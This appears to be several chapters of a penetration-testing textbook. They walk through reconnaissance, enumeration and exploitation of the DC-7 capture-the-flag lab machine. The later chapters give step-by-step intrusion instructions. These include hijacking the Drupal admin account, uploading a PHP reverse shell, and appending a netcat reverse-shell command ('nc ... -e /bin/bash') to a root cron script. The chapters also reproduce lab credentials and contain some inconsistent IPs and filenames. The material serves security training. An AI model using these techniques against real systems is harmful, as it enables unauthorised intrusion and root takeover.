Planning and Reconnaissance
The focus of this chapter is to familiarize the concepts of planning a successful penetration test, gathering information about the targets that are in scope of the testing. Additionally, in this chapter we will attempt to cover the various tools built into Kali Linux to effectively perform
reconnaissance on the target machines set up earlier in the chapter two of this book.

Structure
The focus of this chapter will be covering the following topics and their sub activities:
•	Planning a Penetration Test
•	Reconnaissance of the target machines.

Objective
After reading the chapter you will be able to:
•	Understand the various pre-engagement activities involved in planning a penetration test.
•	Perform hands on reconnaissance of target hosts using various tools present in Kali linux.

Planning a penetration test
Previous chapter explained about the penetration testing framework, as explained in that framework, planning the test entails the set of pre engagement interactions between the testing team and the customer/internal stakeholders (if it's an assessment by an internal PT team). These meetings are held to facilitate exchange of strategic information regarding the exact customer requirements, this helps in defining the exact scope of work and in aligning the engagement contract with the services delivered.

The information exchanged during the interactions also helps in deriving a
suitable tactical plan, schedule and in designing the most effective
engagement contract and a practical test approach.

Expectations
The first step in planning is to discuss the expectations with the customer, and understand the context in which the penetration testing is being requested. A few common expectations from penetration testing are as follows:
•	Mapping the attack surface of the company’s applications, and the IT infrastructure, finding security issues associated with them and translating these findings to actual risk to the business.
•	Identifying security weaknesses, and to address the findings before they are found and exploited by malicious entities.
•	Understanding the effectiveness of internal security teams and processes.
•	Compliance requirements stemming from company information security policy or standards such as ISO/IEC 27000, PCI-DSS and other regulatory obligations.

Scope of testing
The purpose of the penetration testing is to identify the target information assets which will undergo testing, the location of testing (internal or external), the type of testing required (blackbox, greybox, whitebox) and depth of testing that the customer is trying to achieve.

While performing a blackbox test, a very limited knowledge of the systems is provided to the tester, this will usually involve basic information such as individual IP addresses or ranges of the systems in case of infrastructure testing or internet domain names and URLs in case of application penetration testing.

During greybox testing, it is required that the customer share more details regarding the systems such as operating systems, server roles, restricted user credentials, application parameters, and so on. Similarly, for a whitebox testing, in addition to the above, further access to application source-code, design documents, data flow diagrams, configuration files, user and admin credentials, and so on. should be requested.

Note: It is important to understand the existing security layers
implemented in the environment such as network and web firewalls,
intrusion detection systems which may impact the reliability of scans
and the overall speed of testing.


Communication
Success of the penetration testing depends on establishing clear communication between the parties, periodic schedule should be defined for exchange of progress updates. Additionally, dedicated channels should be established to communicate issues encountered by both parties during testing, it is important to understand the emergency contacts.

Due to the extremely sensitive nature of the information being exchanged. It is wise to agree upon encrypted channels (password protected files, PGP/GPG encrypted emails, and so on.) for sending sensitive information.

Problem escalation hierarchy
During a penetration testing exercise, it is important to have clear escalation hierarchy defined in the engagement contract along with the turn-around and problem resolution times. This is established to ensure that any potential future issues arising during the course testing are promptly communicated to the right set of people and get addressed in a timely manner. Some common scenarios which require invoking escalation include:

•	Unavailability of access to target infrastructure or application.
•	Network access blocked by firewall or intrusion detection and prevention systems.
•	Test account inactivation or lockout.
•	Communication of critical vulnerabilities.
•	Approvals required for exploitation.
•	Target infrastructure or application platforms inadvertently getting knocked out due to testing.

Escalation matrix also ensures that any unresolved issues get adequate management support before they can cause any impact to the overall project schedule.

Key personnel
Contact information about the key personnel such as name, designation, email, phone number should be exchanged between the parties along with the role they would play during the penetration test, this information should be documented in the statement of work and engagement contract. The documents should be duly signed with the client, and shared over the
mutually agreed secure communication channels as described before.

Personnel from the client’s side include representatives from:
Key stakeholders from the management
•	Project manager
•	IT Administration
•	Information security
•	Network security
•	Security operations center
•	Application development
Personnel overseeing, managing and carrying out the testing.
•	Management
•	Project manager
•	Lead penetration tester
•	Team members

Testing window
The factor by which you should be able to decide a testing window will depend on the overall maturity of the customer’s security team, the environment provided for testing (development/production) and criticality of the systems under review.

This could range anywhere from 24x7 testing to just a few hours a day during off business or non-peak hours or in some cases could be weekend only, it is very important to bear this in mind while preparing a test schedule. Adequate support staff should be available at the customer’s end
for quickly addressing any problems encountered by the testing team should
any issues arise.

Once the test dates and timing are agreed they should be noted down in the contract document signed by both parties.

Test limitations
As some of the testing may impact the test environment directly. It is crucial to understand the customer’s reservations, and set adequate boundaries for the test being undertaken, this setting of boundaries may be done for multiple reasons some of which include the following:
•	To avoid crashing the tested systems or services (example: denial of service).
•	To avoid impact to the performance of test systems (example: denial of service).
•	To conserve time in case tests may run for too long (example: brute forcing of login forms).
•	To avoid exposure of sensitive data (example: uploading of password hashes to online cracking websites).
•	To avoid malicious scripts being introduced to the environment
(example: uploading web shells, kernel exploits, and so on.)

Upon completion of pre-engagement discussions, planning, scheduling, and contract signing. The testing can begin as per the test window agreed.

Reconnaissance
This section is aimed at familiarizing the user with different reconnaissance tools and techniques available in Kali Linux by practicing their skills in the lab environment which was created earlier in the book.

Let’s proceed with the practical aspects of penetration testing in our lab environment. Boot up the Kali Linux machine, and the various target machines to practice the exercises given ahead. Please allow an adequate amount of time for the target machines to fully boot up before starting the test.
Log into the Kali Linux system, open a terminal window from the dock and issue an ifconfig command to get the network and IP details assigned to our Kali system.
 

The output of ifconfig command shows that our Kali system has been assigned an IP address 10.0.2.15 and the network mask is set to 255.255.255.0.

One thing we know from our target environment is that the test machines are on the same virtual network as our Kali system. Going by the network mask information we can derive that the network consists of a total of 256 host IP addresses. Excluding the network IP 10.0.2.0 and the broadcast IP

10.0.2.255 addresses we are left with a usable host IP range between 10.0.2.1 through 10.0.2.254 for the target systems
DC7
 

Screenshot of DC-7 machine fully booted up. The DC-7 console displays the current IP assigned to it, however in a real world test, this will not be the case hence, we will explore means to find out this information over the network.

There are many readymade tools available on Kali Linux to perform target reconnaissance but using them directly without understanding their inner workings would result in not grasping the core concepts. The initial exercises would involve writing basic scripts for performing target

reconnaissance taking this approach should hopefully help clarify things for the reader before using the readymade tools available in Kali Linux. One option to find ‘alive’ hosts on a network is to perform a scan of the network with a series of ping (ICMP echo) requests and wait for responses from the hosts which are up and running. So, let’s open a terminal window and create a very basic ping sweeper utilising a bash ‘for’ loop to send ICMP echo requests to all the hosts in the IP range using the built-in ping command.

 


The number of ICMP echo requests sent by the ping command to each host have been restricted to 1 using the -c ‘count’ flag without this restriction standard Linux ping command will keep sending ping requests indefinitely unless interrupted by pressing ^c. To speed up the script run time the timeout setting has also been reduced and set to 1 second using the -W flag. This means that the ping command will wait for ICMP responses for 1 second before timing out and exiting. The ping output contains failed ping requests along with the ping responses received from alive ‘hosts’, to avoid seeing the failed requests on our screen we piped the output received through the grep command using keywords “bytes from” to only show us the hosts which have responded to our requests

As seen from the output, the command performed as expected, and returned all the ‘alive’ hosts within the 10.0.2.X range. The lab environment we are using has multiple active machines, and the ping sweep of test lab shows replies from multiple hosts, this output would be different in the case of the reader if only DC-7 machine is booted up. Note: This type of network mapping will fail if hosts have ICMP echo requests/responses disabled. The pingsweep command that we created confirmed that the IP address of DC-7 machine was online with the IP address 10.0.2.27, we will further probe the IP address by checking for open ports on the DC-7 machine by crafting a similar one-line shell command. To start off, we will scan only the first 1024 out of 65535 tcp ports available on the target host

 

The command shown in the screenshot above performs a TCP connect scan on the privileged port range (1-1024) of the target machine. It achieves this by probing the ports one by one using the netcat utility. Netcat is a highly versatile tool for penetration testers as it has multiple functionalities which can be leveraged in virtually all phases of the penetration test.

In order to speed up the scanning process the timeout window has been reduced to 1 using the -w flag along with -z flag (zero - I/O mode) used specifically for scanning purposes. The -n flag stops netcat from performing reverse domain resolution and -v flag instructs netcat to produce verbose output

The port scanning command found a total of 2 ports open on the target system, let’s probe them further to find the services running behind the open ports

 

Netcat command output shows the banner information of SSH service running on the target system. The SSH service banner shows that it is an OpenSSH version 7.4p1 and further information that the target is a Linux system running Debian 10 based distribution. Using the same approach let’s see what we can find out about the HTTP service using netcat
 

Netcat command followed by junk input causes the HTTP service to display an error page. Looking at the HTTP response shows that HTTP service running on port 80 is an Apache server version 2.4.25. The web server also seems misconfigured as we can notice a loopback IP address 127.0.1.1 in the server’s response page. Let’s see if we can enumerate this service further by taking a look at the website running on port 80 using the firefox browser
 

Browsing the DC7 HTTP service using Firefox brings up a fairly basic website seemingly designed purely to provide some hints regarding the capture the flag (CTF) challenge. Firstly, that the challenge is not very technical and secondly to think outside the box. Bottom of the webpage shows that the website is using Drupal which is an open-source content management framework written in PHP language. The last line of the page is @DC7USER which is either the local Drupal account username or some sort of an online account handle. Let’s explore the webpage source-code to see if we can find anything useful there. With the DC7 webpage in view press Ctrl+U within the firefox browser to open the page-source.

 



The page source reveals that the version 8 of Drupal running on the target system but nothing much apart from that. Let’s see if we can find something about @DC7USER through a Google search
 


The google search brought up a few interesting entries on Github and Twitter.
Take notes on the observations made so far, and we will continue with this machine in the next chapter.
Observation Notes:
IP address: 10.0.2.27
Operating System: Linux (Debian 10 based)
Open Ports & Services:
22/tcp - SSH
OpenSSH 7.4p1 (gathered from service banner)
80/tcp - HTTP
Apache 2.4.25 (gathered from service banner)
Drupal 8 (gathered from page source)
Internet handle @DC7user on the main page
Google search of the handle revealed Twitter and Github accounts

































Service Enumeration and Scanning
The previous chapter was divided into two main parts. The first half of the previous chapter covered the various pre-engagement activities which are needed to plan a successful penetration test. The latter half of the chapter covered the theory of reconnaissance along with hands-on usage of tools available on kali linux to obtain valuable information about the target
systems. This chapter will explain how to utilize the knowledge gained about the
targets in the previous chapter to perform further scanning and enumeration of the services identified by us earlier.
Structure
In this chapter, we will touch upon the following topics:
•	Enumeration of various services
•	Scanning services to identify potential weaknesses and entry points
Objectives
After reading this chapter, you will be able to:
•	Understand the theory of enumeration and service scanning.
•	Perform enumeration and service scanning using the tools available within Kali Linux.

DC-7
We had previously identified an Apache web server running a Drupal based website on port 80 of the target, moving forward we will be enumerating this service further to find any important files or directories present on it. Let’s open up a terminal and run a dictionary-based web content scan against the website using the command dirb http://10.0.2.27
 
You will notice that the default scan without any switches takes a significant amount of time and most of the scan output consists of 403 forbidden error pages, as reflected in the scan results in above screenshot. You can improve this scan timing and output by running this command: dirb http://10.0.2.27 -r -N 403

 

The -r switch stops the dirb tool from recursively checking for the same files in any directories identified. The DC-7 target responds with a lot of 403 messages for many directories, and -N option is used to instruct the dirb tool to ignore or filter out unwanted responses and minimize false entries from showing up in the scan results. Notice the robots.txt file is present on the target system; this file is used by website administrators to stop search engines from indexing sensitive files and directories. Now, open up the Firefox browser from the dock and browse to: http://10.0.2.27/robots.txt
 

In the preceding screenshot of robots.txt, you will notice the list of potentially sensitive files, and directories. Take a note of the list and browse each entry one by one to explore if any useful discovery can be made. In the previous chapter we had discovered twitter handle on the target web page and the subsequent Google search showed a few results pertaining to the twitter handle including a GitHub source code repository: https://github.com/Dc7User/staffdb

 

We can see that the GitHub page for Dc7User seems to be a source-code repository containing many files which may prove useful to us by providing some insights into the functioning of the application. After carefully exploring the files one by one, and analyzing all the useful information you will be able to collect useful information about the functioning of the application and its logic

 

One such file available on the Dc7User’s GitHub page is config.php located under the staffdb directory, the config.php source-code file is shown in the preceding screenshot. The database name to store application data is ‘staffdb’ and the username, password used by the application are dc7user and MdR3xOgB7#dW respectively. You can also notice that the application connects to a database server on localhost. This server did not show up on our nmap scan so the database service is only configured to listen on the loopback interface or is potentially being filtered using a host-based firewall. As the database service is not accessible to us remotely. We will have to verify these credentials using the other services such as SSH and HTTP that were found to be open on the target system. Take notes on the observations made so far, and we will continue with this machine in the next chapter

Observation Notes:
IP address: 10.0.2.27
Operating System: Linux (Debian 10 based)
Open Ports & Services:
22/tcp - SSH
OpenSSH 7.4p1 (gathered from service banner)
80/tcp - HTTP
Apache 2.4.25 (gathered from service banner)
Found robots.txt
Drupal 8 (gathered from page source)
Internet handle @DC7user on the main page
Google search of the handle revealed Twitter and Github
accounts.
Found source-code and credentials ‘dc7user and
‘MdR3xOgB7#dW


VULNERABILITY RESEARCH
On enumeration we saw covered the topic of service enumeration and scanning along with hands-on usage of tools available on kali linux to obtain valuable information about the various services running on the target systems. 
During this chapter you will become familiarized with concepts of researching vulnerabilities on the target systems by using the tools built into Kali Linux, we will also cover a few online resources used for researching information about vulnerabilities.
Structure 
Following are the topics that will be discussed during this chapter: 
•	Research vulnerabilities about various services and identifying workable exploits. 
•	Evaluate the exploitability of the identified weakness on the target system. 

Objectives 
After reading this chapter, you will be able to: 
•	Understand the concepts of vulnerability research. 
•	Perform vulnerability research using the online resources and tools built-in Kali Linux. 
We will now continue the process and exploit the target systems using the information gathered during the previous stages.
DC-7
In the previous chapter we discovered a set of user credentials on Dc7User’s GitHub page, now using those credentials we will attempt to gain access to the various services and systems. 
Open up the firefox, browse to http://10.0.2.27/user/login and login with dc7user and password MdR3xOgB7#Dw
 
Notice that the login did not succeed with the credentials supplied by us, as reflected in the scan results, in above screenshot. The next best thing is to try a few more services, at this stage it's logical to attempt to login into the SSH service.  Use the command ssh -l dc7user 10.0.2.27, 
type yes to accept the server’s ECDSA fingerprint and enter the password MdR3xOgB7#Dw when prompted.
 
This will allow to successfully log into the system as dc7user. We can see the SSH post login message which reveals the Debian release and Kernel version, furthermore you will also notice that the user has received a new email. Let’s explore the user’s home directory to find out more about the target system
 
Issuing the ls -la command in the home directory of the dc7user’s, shows a file called mbox and directory named backups, further looking into the backup directory shows two gpg files. Let’s view the contents of the user’s mbox file using the command cat mbox | less and scroll through the output using the arrow keys.
 


You will notice a lot of emails from root@dc-7 generated by Cron Daemon which is a typical task scheduling service for *nix system. The contents of the email tell us that the Cron scheduler executed /opt/scripts/backup.sh script and that the dump of the database was stored to /home/dc7user/backups/website.sql 
Let’s take a look at the backup.sh script permissions to check if we can modify it.
 
The script is owned by root user and the group access is limited to www data other users on the system do not have write permission on the file. This means that we will not be able to edit the backup script. We do have read access to the file so let’s check the contents of the script by running the command cat /opt/scripts/backup.sh from the terminal.
 
Examination of the contents of the backup script tells us that the script is being used to backup the contents of /var/www/html and sql database to /home/dc7user/backups. We can see that drush is being used for taking sql database backup and also that the website.sql and website.tar.gz files are encrypted using gpg using a passphrase PickYourOwnPassword A quick web search for drush reveals that it is a command line tool for performing administrative tasks on Drupal based websites. This functionality includes functionality of resetting password for users. 
https://www.a2hosting.in/kb/installable-applications/optimization-and configuration/drupal2/resetting-the-drupal-administrator-password 
Let’s change the current directory in the terminal to /var/www/html and run the command drush upwd --password=”admin123” admin to change the current password for the admin user to admin123
 
The admin password for Drupal site was successfully changed to ‘admin123’. We should now have full control on the Drupal website. We now need to focus on leveraging the Drupal admin access to obtain shell access on the target system, for this to happen we need to create a PHP script or find a way to upload and execute a php script target system. A bit of information gathering on the internet reveals that PHP code functionality is provided by a Drupal module named ‘php’ which has been removed from Drupal versions 8.x and above. Interestingly Drush provides a way to enable modules so let’s re-enable this module using the command drush en php from the terminal and press ‘y’ when prompted to confirm the download.
 
The download failed, looks like the dc7user does not have write permissions to the /var/www/html/directory. The earlier approach did not work however we should still be able to install the module by accessing our Drupal installation through browser
Using the firefox browser download the php module to our Kali system from https://www.drupal.org/project/php. Login to the target Drupal installation using the admin (username:admin, password:admin123) credentials, click on ‘Extend’ and then on ‘+install new module’ button. Browse to the php 8.x-1.0.tar.gz module and upload it to the Drupal site by clicking on the ‘Install’ button.

 Once this step is complete you will be presented with a message that the module was installed successfully, click on ‘enable newly added modules’ link in message or browse to the http://10.0.2.27/admin/modules page. Scroll through the modules list to find the ‘PHP Filter’ module, click on the checkbox next to the module, and then click on the ‘Install’ button to enable it.
 
The ‘PHP Filter’ module has been enabled on the target; we should now be able to upload custom PHP scripts on Drupal in order to obtain a reverse shell access. With the ground work now complete, we will conclude the research phase for the DC7 machine and exploit the loophole in the next chapter. Take notes on the observations made so far, and we will continue with this machine in the next chapter.

Observation Notes:
IP address: 10.0.2.27
Operating System: Linux (Debian 10 based)
Open Ports & Services:
22/tcp - SSH
OpenSSH 7.4p1 (gathered from service banner)
SSH allows login for dc7user using the credentials found on
GitHub page.
Bash script /opt/scripts/backup.sh used to backup website and
sql database.
Cron is being used to run the backup.sh script periodically.
Drush is being used to administer Drupal
80/tcp - HTTP
Apache 2.4.25 (gathered from service banner)
Found robots.txt
Drupal 8 (gathered from page source)
Admin password changed to ‘admin123’
PHP Filter module was uploaded and enabled to allow
custom PHP code execution.
Internet handle @DC7user on the main page
Google search of the handle revealed Twitter and GitHub accounts.
Found source-code and credentials ‘dc7user and ‘MdR3xOgB7#dW’








EXPLOITATION
In Chapter 7, Vulnerability Research we had explained how important vulnerability research is during any security testing along with familiarizing you with the tools available within Kali, and on the internet for identifying relevant exploits available for the services running on the target hosts. This chapter will dive into exploitation of the target systems using the information gathered so far along with exploits identified during the previous chapters.

Structure
 In this chapter, we will touch upon the following topics: 
Creating web-shells using php and using them to execute commands 
Upgrading webshells to fully interactive reverse shells using netcat 
Using the Metasploit exploitation framework 
Manual exploitation and reverse shell listeners 

Objectives 
After reading this chapter, you will be able to: 
Understand the concepts of vulnerability exploitation. 
Create web-shells. 
Bypass target restrictions. 
Perform manual and automated exploitation. 

So let's begin with the next steps,

DC-7 
In the previous steps we logged into the target system using the dc7user’s credentials and changed the Drupal admin user’s password to admin123 using the Drush utility. Additionally, we also downloaded and enabled the ‘PHP Filter’ module on the remote Drupal installation in order to allow us to add and execute custom PHP code on the target system. 

Continuing further, now let’s attempt to leverage this extended functionality of Drupal to obtain web-based shell access on the target. To do this, create a page on Drupal containing the malicious PHP code. 

Kali Linux offers a lot of webshells under the /usr/share/webshells directory, for this exercise let’s use the php based reverse shell located in /usr/share/webshells/php/php-reverse-shell.php. 

Open the php-reverse-shell.php file using the cat command or any favourite text editor and copy the entire contents of the file onto clipboard. 
1. Open up the Drupal page on the target system using Firefox browser and login with admin and password ‘admin123’. 
2. Click on the ‘Content’ option under the manage ‘Manage’ section.





 
3. Click on the ‘+Add content’ button and click on the ‘Basic page’ link in the resulting page. 
4. Add the PHP reverse shell in the ‘Title’ field, paste the code for php reverse-shell.php in the ‘Body’ section and select ‘PHP code’, but before you must enable php using “drush” tool > drush en php in this file path /var/www/html in the ‘Text format’ drop-down menu.
 


In the preceding screenshot, notice the “Body” section, Modify the $ip and $port variables in the PHP code to receive the reverse shell on our Kali system and click on the ‘Save’ button to save the code. In the screenshot above we have modified the value for the $ip variable to 10.0.2.238 which is the IP address of our Kali system and the $port variable has been set to 9876. (matching our lab environment) Now open terminal and start a netcat session on Kali system and configure it to listen for incoming sessions on port 9876. (Issue the command nc -lvp 9876)
 
Netcat is also known as the swiss army knife of penetration testing tools, it offers a ton of extremely useful features to the testers some of which we will be progressively exploring as we go on exploiting various targets covered in this book. In the example above we have set up a simple listener using the ‘-l’ flag, the ‘-v’ flag sets netcat in verbose mode which may help in troubleshooting connection related issues and finally the -p flag is used to set the port. As the above example uses the -p port flag in -l listener mode the netcat command will listen for incoming connections on port 9876. Once the listener has been successfully set up go back on the Drupal page and click on the ‘preview’ button to execute our malicious PHP code on our DC7 target.
 
Great! The PHP code ran perfectly on the target and you should now have a working shell access on the DC7 system with privileges of user www-data. The initial exploitation of DC7 target is now complete and we have shell access to the www-data user, in the next chapter you will learn to exploit the backup script running as cron-job to obtain root access. 

Observation Notes:
IP address: 10.0.2.27
Operating System: Linux (Debian 10 based)
Open Ports & Services:
22/tcp - SSH
OpenSSH 7.4p1 (gathered from service banner)
SSH allows login for dc7user using the credentials found on
GitHub page.
Bash script /opt/scripts/backup.sh used to backup website and
sql database.
Cron is being used to run the backup.sh script periodically.
Backup.sh script can be modified by the root user or users
belonging to the www-data group.
Drush is being used to administer Drupal
80/tcp - HTTP
Apache 2.4.25 (gathered from service banner)
Found robots.txt
Drupal 8 (gathered from page source)
Admin password changed to ‘admin123’
PHP Filter module was uploaded and enabled to allow custom
PHP code execution.
PHP reverse shell was uploaded to the server.
 Reverse connection established with privileges of www-data user.
Internet handle @DC7user on the main page
Google search of the handle revealed Twitter and Githubaccounts.
Found source-code ‘MdR3xOgB7#dW’



Post Exploitation

In the previous chapter we covered the topic of exploitation of the target systems and learnt about using the various tools and techniques applicable during the exploitation phase of a penetration test to obtain initial level of access on the target systems.

This chapter will delve into the subject of post exploitation and activities performed in this phase, we will leverage upon the initial access obtained on the target systems and information gained about them during the previous chapters to completely take over the target systems by obtaining administrative access on them.

Structure
In this chapter, we will touch upon the following topics:
•	Attacking administrative scheduled jobs.
•	Attacking privileged scripts and binaries.
•	Scanning using automated scripts.
•	Exploiting Kernel or Privileged services.
We will also follow following objectives:

Objectives
After reading this chapter, you will be able to:
•	Perform manual and automated scan to identify potential points of
•	privilege escalation.
•	Transfer files between Kali and target hosts using netcat.
•	Exploit SUID SGID binaries.
•	Exploit Kernel or system processes to elevate access.
•	Crack password hashes. 
•	Perform escape sequences to obtain shell. 

So, let's begin with the next steps.
DC-7
During the previous chapter we had uploaded a PHP reverse shell on the target and gained initial access into the DC-7 target with the privileges of www-data user. Continuing further, we opened up the Drupal/PHP reverse shell that we received on port 9876 in the previous chapter, we will leverage this shell to exploit the system to obtain privileged access. You might recall that the backups.sh file group was set to www-data in Chapter 7, Vulnerability Research.
 

Now upon checking the file permissions we can re-confirm that the www data group has read, write and execute permissions to the backups.sh file. 
You may also remember from Chapter 7, Vulnerability Research that the backups.sh script is executed by the cron daemon to perform backups tasks using root privileges.

We already have written access to the backups.sh file, and hence the easiest way to obtain root is to simply add a reverse shell entry in the backups.sh file, and wait for cron daemon to execute it as root.
On a separate Kali terminal window setup, a netcat listener to listen on port 9879 to receive the root shell
 
Let’s go back to the window containing the Drupal/PHP reverse shell to append the payload to the /opt/scripts/backups.sh file.
1. Enter the /opt/scripts directory using the cd command.
2. Type the command echo "nc 10.0.2.3 9879 -e /bin/bash" >>
./backups.sh
n/b: here the ip address of linux remains the only thing changing is the port number from 9876 to 9879
 
The output of tail command on backups.sh shows that our payload has been successfully added to the file. All we have to do now is to wait for the cron daemon to execute the backups.sh job, and receive a reverse shell on our netcat listener port 9879.

If you have set up things correctly, then you should receive a connect back from the DC7 target with root privileges. Upon receiving the connect back confirm the privileges by executing the id command and viewing the contents of theflag.txt file in the root user’s home directory.
 

 

Well done! You have successfully obtained administrative privileges on the DC7 target.
Take notes on the observations made.
Observation Notes:
IP address: 10.0.2.27
Operating System: Linux (Debian 10 based)
Open Ports & Services:
22/tcp - SSH
OpenSSH 7.4p1 (gathered from service banner)
SSH allows login for dc7user using the credentials found on
GitHub page.
Bash script /opt/scripts/backup.sh used to backup website and
sql database.
Cron is being used to run the backup.sh script periodically.
Backup.sh script can be modified by the root user or users
belonging to the www-data group.
The script was appended with a netcat reverse shell payload
to obtain root privileges.
Drush is being used to administer Drupal
80/tcp - HTTP
Apache 2.4.25 (gathered from service banner)
Found robots.txt
Drupal 8 (gathered from page source)
Admin password changed to ‘admin123’
PHP Filter module was uploaded and enabled to allow custom PHP code execution.
PHP reverse shell was uploaded to the server.
 Reverse connection established with privileges of www data user.
Internet handle @DC7user on the main page
Google search of the handle revealed Twitter and Github accounts.
Found source-code and credentials ‘dc7user and ‘MdR3xOgB7#dW’
/opt/scripts/backups.sh is writable by users belonging to www-data group
The script was appended with a netcat reverse shell payload to obtain root privileges.
